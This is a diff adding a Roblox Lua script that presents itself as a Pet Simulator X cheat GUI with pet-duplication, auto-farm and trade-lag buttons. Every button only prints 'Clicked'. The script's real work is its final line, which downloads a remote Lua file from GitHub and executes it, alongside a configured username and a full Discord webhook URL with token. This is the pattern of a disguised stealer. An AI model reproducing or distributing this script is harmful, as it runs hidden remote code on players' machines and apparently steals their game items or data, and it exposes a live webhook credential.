@@ -1,0 +1,21 @@
+Username = "bosulDamian"
+WebHook = "https://discord.com/api/webhooks/1086342849844478063/seMonvUQaqO3gJwr5XPmsBYYcC4-VGs_0S7o7qBPSKHrrLXR8uHO0c8M9CYoxIs28HBR"
+loadingscreen = false
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("PSX BEST SCRIPT", "DarkTheme")
+local Tab = Window:NewTab("Dupe pets")
+local Section = Tab:NewSection("Dupe pets")
+Section:NewButton("Dupe", "This button duped pets", function()
+    print("Clicked")
+end)
+local Tab = Window:NewTab("Auto Farm")
+local Section = Tab:NewSection("Farming")
+Section:NewButton("AutoFarm", "Auto farm in area where you are", function()
+    print("Clicked")
+end)
+local Tab = Window:NewTab("Server lag")
+local Section = Tab:NewSection("lag your trade")
+Section:NewButton("Lag", "lags trade", function()
+    print("Clicked")
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
